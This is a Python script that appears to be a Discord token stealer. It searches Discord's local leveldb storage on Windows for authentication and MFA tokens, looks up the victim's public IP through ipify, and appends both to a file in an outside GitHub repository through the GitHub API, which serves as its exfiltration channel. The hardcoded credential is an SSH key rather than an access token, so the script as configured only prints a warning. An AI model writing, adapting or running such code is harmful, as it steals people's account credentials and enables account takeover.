import os
import re
import json
import requests
from datetime import datetime
import base64

def fdt():
    t = []
    p = [os.path.join(os.getenv('LOCALAPPDATA'), 'Discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb')]
    for pa in p:
        if not os.path.exists(pa):
            continue
        for fn in os.listdir(pa):
            if not fn.endswith('.log') and not fn.endswith('.ldb'):
                continue
            for li in [x.strip() for x in open(os.path.join(pa, fn), errors='ignore').readlines() if x.strip()]:
                for rx in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for tk in re.findall(rx, li):
                        t.append(tk)
    return list(set(t))

def gia():
    try:
        r = requests.get('https://api.ipify.org?format=json')
        r.raise_for_status()
        return r.json()['ip']
    except requests.exceptions.RequestException:
        return None

def stupr_append(tkns, ip, ghtk, rpo):
    gua = f'https://api.github.com/repos/{rpo}/contents/list.txt'
    h = {'Authorization': f'token {ghtk}', 'Accept': 'application/vnd.github.v3+json'}
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    entry = f"Timestamp: {ts}\nTokens:\n{chr(10).join(tkns)}\nIP Address: {ip if ip else 'N/A'}\n\n"
    cm = f'Add log entry - {ts}'

    try:
        # Get existing content (if any)
        get_response = requests.get(gua, headers=h)
        get_response.raise_for_status()
        content = base64.b64decode(get_response.json()['content']).decode('utf-8')
        sha = get_response.json()['sha']
        updated_content = content + entry
        encoded_content = base64.b64encode(updated_content.encode('utf-8')).decode('utf-8')
        data = {'message': cm, 'content': encoded_content, 'sha': sha}
        put_response = requests.put(gua, headers=h, data=json.dumps(data))
        put_response.raise_for_status()
        print(f"Log appended to list.txt: {put_response.json()['content']['html_url']}")
    except requests.exceptions.RequestException as e:
        if e.response is not None and e.response.status_code == 404:
            
            encoded_content = base64.b64encode(entry.encode('utf-8')).decode('utf-8')
            data = {'message': cm, 'content': encoded_content}
            put_response = requests.put(gua, headers=h, data=json.dumps(data))
            put_response.raise_for_status()
            print(f"list.txt created and log added: {put_response.json()['content']['html_url']}")
        else:
            print(f"Error updating list.txt: {e}")
            if e.response is not None:
                print(f"Github API Error: {e.response.status_code} - {e.response.json()}")

if __name__ == "__main__":
    tokens = fdt()
    ip_address = gia()
    ght = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBXDPKRDq6FCll0dYdJw9hzbesUt5hekJBWiMKhsFcJm"
    repo = "Syxfer/mal_dis_ip_tsmalann_syxfer"
    if ght.startswith("ssh-"): 
        print("Warning: You appear to be using an SSH key, not a Personal Access Token. This script requires a Personal Access Token with 'repo' scope.")
    elif tokens or ip_address:
        stupr_append(tokens, ip_address, ght, repo)
